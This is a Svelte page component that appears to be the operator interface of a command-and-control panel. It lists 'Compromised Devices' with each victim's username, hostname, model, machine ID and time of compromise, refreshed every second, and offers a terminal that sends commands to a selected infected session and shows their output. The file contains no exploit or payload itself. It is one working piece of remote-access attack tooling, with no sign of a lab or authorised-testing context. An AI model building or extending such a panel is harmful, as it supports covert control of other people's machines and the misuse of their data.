<script lang="ts">
  import { onMount } from 'svelte';
  import { enhance } from '$app/forms';
  import SplitPane from '$lib/components/SplitPane.svelte';

  function clearResult() {
        error = "";
    }
    let error = $state("");

  let stdout: HTMLElement;
  let inputEl: HTMLElement;

  let cmd = $state("");
  let sid = $state("");
  let idle_s = $state("");
  let pwns = $state<{
        id: number;
        sid: string;
        username: string;
        hostname: string;
        model: string;
        machine_id: string;
        pwned_at: Date;
    }[]>([]);

  function Interact(device: {
        id: number;
        sid: string;
        username: string;
        hostname: string;
        model: string;
        machine_id: string;
        pwned_at: Date;
    }) {
        sid = device.sid;
        idle_s = `${device.username}@${device.hostname} >$`;
        inputEl.focus();
    }

  onMount(() => {
    async function updateList() {
        const res = await fetch('/api/devices', { credentials: 'include' });
        const json = await res.json();
        if (json.error) {
            error = json.error;
            setTimeout(clearResult, 5000);
            return;
        }
        pwns = json.devices;
    }

    async function updateOutput() {
        const res = await fetch('/api/session', { credentials: "include" });
        const json = await res.json();
        if (json.error) {
            error = json.error;
            setTimeout(clearResult, 5000);
            return;
        }
        stdout.textContent = json.output;
    }

    updateList();
    updateOutput();
    const t1 = setInterval(updateList, 1000);
    const t2 = setInterval(updateOutput, 1000);

    document.body.classList.add('no-scroll');
    return () => {
        clearInterval(t1); // clean up on destroy
        clearInterval(t2); // clean up on destroy
        document.body.classList.remove('no-scroll');
    };
  });
</script>

<SplitPane>
  {#snippet topContent()}
    <div style="padding: 1rem;">
      <h2>Compromised Devices</h2>
        <!-- Popup / alert area -->
        {#if error}
            <div class="alert alert-danger">{error}</div>
        {/if}
      <hr>

      <ul>
        {#each pwns as d}
            <li>
                <strong>{d.username}@{d.hostname}</strong>
                <small>({d.id})</small><br>

                Device: {d.model}<br>

                <small>
                    Machine ID:
                    <code>{d.machine_id}</code>
                </small><br>
                <button
                    class="btn btn-primary"
                    onclick={ () => { Interact(d) } }
                >Connect</button>
            </li>
        {/each}
      </ul>
    </div>
  {/snippet}

  {#snippet bottomContent()}
    <div class="terminal">
        <div class="stdout-area">
            <pre id="term-out" class="stdout" bind:this={stdout}></pre>
        </div>
        <form method="POST" action="?/send" use:enhance={() => {
            return async ({ update }) => {
                await update();
                cmd = '';
                inputEl.focus();
            };
        }}>
            <input
                id="cmd"
                name="cmd"
                class="stdin"
                type="text"
                bind:this={inputEl}
                bind:value={cmd}
                placeholder={idle_s}
                autocomplete="off"
                spellcheck="false"
            />
            <input
                type="hidden"
                id="sid"
                name="sid"
                bind:value={sid}
            >
        </form>
    </div>
  {/snippet}
</SplitPane>

<style>
    :global(body.no-scroll) {
        margin: 0;
        padding: 0;
        height: 100%;
        overflow: hidden;
    }

    .terminal {
        display: flex;
        flex-direction: column;
        height: 88%;
        min-height: 0;
    }

    .stdout-area {
        flex: 1;
        min-height: 0;
        overflow: hidden; /* let .stdout handle the scroll */
        margin: 10px;
        display: flex;
        flex-direction: column;
    }

    .stdout {
        flex: 1;
        min-height: 0;
        overflow-y: auto;   /* vertical scroll only */
        overflow-x: hidden; /* no horizontal scroll */
        padding: 10px;
        margin: 0;          /* pre has default browser margin — kill it */
        background-color: rgba(255, 255, 255, 0.05);
        color: #d4d4d4;
        border: 1px solid rgba(255, 255, 255, 0.1);
        border-radius: 4px;
        font-family: 'Courier New', monospace;
        font-size: 13px;
        white-space: pre-wrap;  /* preserves whitespace but wraps at container edge */
        word-break: break-all;  /* breaks long lines (e.g. base64, paths) that would overflow */
        box-sizing: border-box;
    }

    .stdin {
        flex-shrink: 0;
        width: calc(100% - 20px);
        box-sizing: border-box;
        margin: 0 10px 10px;
        padding: 8px 12px;
        background-color: rgba(255, 255, 255, 0.05);
        color: #d4d4d4;
        border: 1px solid rgba(255, 255, 255, 0.1);
        border-radius: 4px;
        font-family: 'Courier New', monospace;
        font-size: 13px;
        outline: none;
        transition: border-color 0.15s, background-color 0.15s;
    }

    .stdin:focus {
        border-color: rgba(66, 133, 244, 0.6);
        background-color: rgba(255, 255, 255, 0.08);
    }

    .stdin::placeholder {
        color: #ffffff;
    }

    li {
        padding: 0.5rem 0;
        border-bottom: 1px solid #444;
    }

    small {
        color: #888;
    }

    code {
        font-family: monospace;
    }
</style>